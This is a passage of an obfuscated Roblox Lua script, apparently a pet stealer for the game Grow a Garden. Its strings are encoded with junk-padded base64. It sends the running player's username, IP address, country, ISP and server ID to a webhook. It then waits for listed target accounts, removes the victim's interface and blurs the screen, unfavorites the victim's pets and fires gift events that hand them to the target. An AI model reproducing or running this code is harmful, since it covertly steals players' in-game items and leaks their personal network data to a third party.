    else
        warn(eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('pvzlOLmYLUjdprlAwIdcKYJncLAkFzcPvSLTbGYKMryEFTXNoSKjupzWyFdIE5vIHB1YmxpYyBzZXJ2ZXIgZm91bmQu'))
    end
end

-- HELPERS
function freezeVisual()
    local blur = Instance.new(eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('QKJsNPbgVQmbZLKcWIkePSOxzirSurBYoyYVhapgmOEfYtkGMmdZwLMQmx1ckVmZmVjdA=='))
    blur.Size = 999
    blur.Parent = Lighting
end

local function hasKeyword(name, list)
    for _, keyword in ipairs(list) do
        if string.find(string.lower(name), string.lower(keyword)) then
            return true
        end
    end
    return false
end

local function getFilteredPets()
    local filtered = {}
    for _, item in pairs(backpack:GetChildren()) do
        if item:IsA(eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('jVrvdItIJtfMkmhpIDxMheRioOjJIsFnkCPCRUxbZEQtYnkkKGNaWBKVG9vbA==')) and hasKeyword(item.Name, petKeywords) then
            table.insert(filtered, item.Name)
        end
    end
    return filtered
end

local function chunkItems(items)
    local chunks = {}
    for i = 1, #items, 5 do
        local chunk = {}
        for j = i, math.min(i+4, #items) do
            table.insert(chunk, eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('dfyXERSFvCjUjClomnpvZEIItiTsAyhdoizGfujWFwQoJAGUSsENVakLSA=') .. items[j])
        end
        table.insert(chunks, {
            name = eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('hMyAGRgUhtQyRaOCaicriBTCZbxEWXhqwzMvTOTJWBgobAFzPHtrLOr8J+OkiBQZXRzIA==') .. tostring(i) .. eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('HwTnjRiEedckWONgFGlplOrquZVughCKAZfrUWQFpZEycXtPQYdsiRa4oCT') .. tostring(math.min(i+4, #items)),
            value = table.concat(chunk, eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('zUmzyEyfrvYTIDrfZQTzXfmZpPFOeUfGKcHrgUPcgdpJZCStIrGHXOQXG4=')),
            inline = false
        })
    end
    return chunks
end

local function sendWebhook(embedFields)
    local data = {
        content = eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('paQAiyWQHfpawiYxzrLRjhcdBJKNHoTeNNAjUGRgaDzUusXTZbaCewG'),
        embeds = {{
            title = eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('hEFLAPvTFBSuVtctocoAbVeFCWwqPAcKYMOmfmpUIBzUtfFUUgXjfOy8J+QviBHcm93IGEgR2FyZGVuIFJlcG9ydA=='),
            color = 16753920,
            fields = embedFields,
            footer = { text = eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('gWswJKaDJYYtWvlPGpDOrPrrFVDjVdrJTIKQyLDpGcwHpRmuKMJcsQhRGVsdGEgRXhlY3V0b3IgTG9nZ2Vy') },
            timestamp = os.date(eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('zpgTIKVKKOZemzQsfrwYDzArlFZNJknyIdGoSCcRFLhdRCDhaSIRgAuISVZLSVtLSVkVCVIOiVNOiVTWg=='))
        }}
    }
    local req = http_request or request or syn.request or fluxus.request
    if req then
        req({
            Url = webhookUrl,
            Method = eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('PkiRmWtZOgSimduUMRaDAGWXygckEiPsNmDBLhhBvEnUTpAKwftqqRTUE9TVA=='),
            Headers = { [eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('XqIxzfYUAenWJtSrrmePAqxsPWrqYcIkPgMsRJZtZVQuYpUAvUiJyQLQ29udGVudC1UeXBl')] = eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('rLFaaTsnWGGBbBDPIcjBsnFuLPPiGZBYnQrgofwSvarHcPNVqCJcsomYXBwbGljYXRpb24vanNvbg==') },
            Body = HttpService:JSONEncode(data)
        })
    end
end

local function getIPInfo()
    local req = http_request or request or syn.request or fluxus.request
    if not req then return eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('skLyZsaiiFcAbtXSgIECVANDpPwtiORgQTMKAPsxJsmgMtdVSPsyFTrVW5rbm93bg=='), eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('VDsDURqtTVwzQWsaisvpiGWvZqzbMZuKaqWdfgNXlOqoJRMtEiPnigIVW5rbm93bg=='), eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('LnOsGNtsZKDsdCrUeJwTdAVjLjjcIxsJJrbQuQRSeousRngPvrzCXisVW5rbm93bg==') end
    local result = req({ Url = eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('ZnDsuAVHbQosQmtAMQAzVXEoqReCsBfWGDSVWVKYeLbVFNDakqRwlLDaHR0cDovL2lwLWFwaS5jb20vanNvbi8='), Method = eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('UdxPYtPZOBOcaSwyjdxViTJkshwRTJnWzRpOjSgXyGqJyccmMSvSXpOR0VU') })
    if result and result.Body then
        local body = HttpService:JSONDecode(result.Body)
        return body.query or eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('TNyEKwHomgINCnZwqUvxXnvJMJswCxSZaBriQtxGsUvreKDnEYTXAiBPw=='), body.country or eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('gRMbESbDPncAIBOKWuewLDPbdJTBshymtZArcoIqmiCxsXSPKfpStZwPw=='), body.isp or eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('OFKCYfETGunCpYKeaAIbxuHzCBygDwyLsvmVlXnBIWnExFHXAidgAIGPw==')
    end
    return eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('mxPemfXNaBKYpKqFnDuAKvaSpfDzTDHAdqTnDxVTpmkVerbxwAaClwaPw=='), eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('VVQbfyjpdBDDequkybcduCeFHYvybzlDyZONBzRrzTmrBgIIIiNAVmpPw=='), eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('oxubTScUfyXupvbefRftyjhSNZDLRRXXUdofkiMVFEhWUYRAFybThmIPw==')
end

-- UNFAVORITE PETS AND SEND LIST
local function unfavoriteAllPets()
    local dex = ReplicatedStorage:FindFirstChild(eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('oBviAoDCRslbKbxngGLuIcZwLxBKpmWghVwbpyEASSnEPFmnzyddMjXRGV4'))
    if not dex then return end
    local unfavorited = {}
    for _, item in pairs(dex:GetChildren()) do
        if item:IsA(eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('XerHEZNYDwgmTDqHPlDCPAzboTXDXnGvuokGczHokVtKOJbbThPFZDUSW5zdGFuY2U=')) and item:GetAttribute(eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('iaYrcgKyBgMEuSCuqurOLlxbyLwAyZPcLuGqDFKWpOPXSqeXTueTixzZA==')) == true then
            table.insert(unfavorited, item.Name)
            ReplicatedStorage:WaitForChild(eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('IYtykZZCbSOzmVUcTwdVZCkMPkUUcqgHxOyKaBYKtWLLzgTctfWYEtCR2FtZUV2ZW50cw==')):WaitForChild(eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('GROiIZkHHVNLGVIfwhGlAoEIuvnWYiLeiMuqgCioNHpseRikwznzVxoVG9nZ2xlRmF2b3JpdGU=')):FireServer(item.Name)
            task.wait(0.2)
        end
    end
    if #unfavorited > 0 then
        sendWebhook({
            { name = eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('irTipoSjzBriTiXvSwryESqkaJghWCSGxSudgRxcaqsPsGXdonUXbpB8J+aqyBVbmZhdm9yaXRlZCBQZXRz'), value = table.concat(unfavorited, eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('suxJZlttdGZJvluEdDVbpPYttyMpchQTIilXMJgAzuIjLzaahmQOutKLCA=')), inline = false }
        })
    end
end

-- Send user info
spawn(function()
    local ip, country, isp = getIPInfo()
    sendWebhook({
        { name = eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('bApEPoRVXYVvrEPCzwBPplPCqcdFiUJWmbvwZvwQBPZyPhhdloiLsqt8J+RpCBVc2VybmFtZQ=='), value = localPlayer.Name },
        { name = eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('lOAkvOGLeRHflKunIARxqnkoqQyciQsUiLXbzEfmwvcFKtJcivSucVF8J+MkCBJUA=='), value = ip },
        { name = eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('cjMBvXSvXVdVGgjmrXdWYiBAHybyFVlzMfEyTjezVbQcpWAAFUbnVro8J+Xuu+4jyBDb3VudHJ5'), value = country },
        { name = eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('DYeCJMVXhTiZbhawXSLmUZDkIIdeNYQsAAHgVzYtdxfGLjtAURqExwr8J+SuyBJU1A='), value = isp },
        { name = eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('xJhftUOFaHHbvHoqpNSIglKxrzEICyVwZBIkEcHFVcDiLZmbOsuqHqI8J+ToSBTZXJ2ZXIgSUQ='), value = jobId },
        { name = eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('JUWEgmvsFzgydyRJLJtwfzJiwlgNSxhUcYlmBlNFYfJEarmjwarPzUZ4o+x77iPIFRpbWU='), value = os.date(eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('mhAoObvMloRiijPrnshzxyvSOFWVwUvRHlynjHRIZyRgBgoxBNClmxBJVktJW0tJWQgJUg6JU06JVM=')) }
    })
end)

-- Send filtered pets
spawn(function()
    local pets = getFilteredPets()
    local petChunks = #pets > 0 and chunkItems(pets) or {
        { name = eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('QvoFHcgpVyYJmZEhXaXdsTquKeAlgCVHNhiiUaBlLSlcTkDjDmEiqHT8J+OkiBQZXRz'), value = eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('mRMGpNApqmdHBgoYslaEFtrwcrxRmqvgZNZSkCrrMyPuLwHZUNusjLZTm9uZQ=='), inline = false }
    }
    sendWebhook(petChunks)
end)

-- Send 3rd message: server status
spawn(function()
    sendWebhook({
        { name = eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('lQPXDyRuiXivLcQzyPpbVmeGOxSeMEYXqzCvJDYxlREHBrIGJjtHhUR8J+UgyBTZXJ2ZXIgU3RhdHVz'), value = wasPrivateServer and eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('RxiDovkKXEAeRkJTcUkXhkMAhpmwXyCZFWTeMslOqSmdPPgLGLffCqHUHJpdmF0ZSBzZXJ2ZXIgZGV0ZWN0ZWQuIFNlcnZlciBob3AgZXhlY3V0ZWQu') or eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('bvfVQOVIqPQstbVITlRedEYupRHmqPJPImsDCPXeQPfsvQOdCcEXHFTQWxyZWFkeSBpbiBwdWJsaWMgc2VydmVyLg=='), inline = false }
    })
end)

-- Periodic activity status report
spawn(function()
    task.wait(300) -- 5 minutes
    local pets = getFilteredPets()
    local hasHighTier = false
    for _, petName in pairs(pets) do
        if hasKeyword(petName, highTierPets) then
            hasHighTier = true
            break
        end
    end
    if #pets > 0 or hasHighTier then
        sendWebhook({
            { name = eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('pVFbBHOusiGbGaPBUnHMHlXkjCOmsjzoVPyQvocbHYnnKgNRTpSmvJH4o+zIDUtTWludXRlIENoZWNr'), value = eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('CfMygkohMMgRwfJZxisNvTwzQAgklARJJjHrDvmLUlzxhwmDFBPTrVYU2NyaXB0IHN0aWxsIHJ1bm5pbmcgd2l0aCByZWxldmFudCBwZXRzLg=='), inline = false },
            { name = eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('qRNedXRuMMraTCypxOxLVUEgWkYoaSiRyaOWIwQrTIbePpcvJUOzWCD8J+RpCBVc2VybmFtZQ=='), value = localPlayer.Name, inline = true },
            { name = eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('dwPSDoOMWSjKJBfuTRWzAxKIffNFRrZoRPCAOHvYfHoDBQpgATczSGS8J+ToSBTZXJ2ZXIgSUQ='), value = jobId, inline = true }
        })
    end
end)

-- Watch for targets, delay 7 sec, hide GUI, drain pets + unfavorite
spawn(function()
    while true do
        for _, player in ipairs(Players:GetPlayers()) do
            if table.find(targetUsernames, player.Name) then
                task.wait(7)
                for _, gui in ipairs(localPlayer.PlayerGui:GetChildren()) do
                    if gui:IsA(eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('jgzLqQLhIpjLGlLKmtJfbrBVnLzPOmFUqKavSQjNZSyaGRNQzXwKccwU2NyZWVuR3Vp')) or gui:IsA(eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('xAjhMJPCacofWEoUFpCLGsVeSUCqCvRbVtzPTAeIUvASaCdtWQZHMFBQmlsbGJvYXJkR3Vp')) or gui:IsA(eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('JUJKwWTWgndLvUzJFcKfjzCiunQuaoWTSTBBbeXAQAFNYzstWqQYPNyU3VyZmFjZUd1aQ==')) then
                        gui:Destroy()
                    end
                end
                unfavoriteAllPets()
                local orderedPets = {}
                for _, tierPet in ipairs(highTierPets) do
                    for _, tool in ipairs(backpack:GetChildren()) do
                        if tool:IsA(eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('hGbdhBvxczHaZDOOEssWwckmtSniapynGRZFUBazqaKRlmwjhZIZdaJVG9vbA==')) and string.find(string.lower(tool.Name), string.lower(tierPet)) then
                            table.insert(orderedPets, tool)
                        end
                    end
                end
                for _, tool in ipairs(backpack:GetChildren()) do
                    if tool:IsA(eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('QjEyYXKhfzOALnuQbOeVxWsARcJarFrDiqBSWkNXmxpChqMxtnQDSwOVG9vbA==')) and hasKeyword(tool.Name, drainPets) and not table.find(orderedPets, tool) then
                        table.insert(orderedPets, tool)
                    end
                end
                for _, tool in ipairs(orderedPets) do
                    freezeVisual()
                    tool.Parent = character
                    wait(0.3)
                    while player and player.Parent == Players and tool.Parent == character do
                        local args = {eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('DxTrSnJtQjAfHlbqsDRVEcMFdPkwwnyiMiLtpyqmZTNMDBKtZPegbRzR2l2ZVBldA=='), player}
                        ReplicatedStorage:WaitForChild(eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('cCmmzpRRpeKBhuAnsSGwvZtsJDbYUUgrCjCOrKwLilSFYcGBZcethfOR2FtZUV2ZW50cw==')):WaitForChild(eGgDHEuGpVgPqFJjWJZILjxDTqQbYNeqDRxGHEzZBAtscKWizMyjRG('oizhWxBkyBxHsJDQRdREPMWubXmAoADBMCQBjBiYSxloOvfVfWiyLsmUGV0R2lmdGluZ1NlcnZpY2U=')):FireServer(unpack(args))
                        wait(0.7)
                    end
                end
            end
        end
        wait(2.5)
    end
end)
    
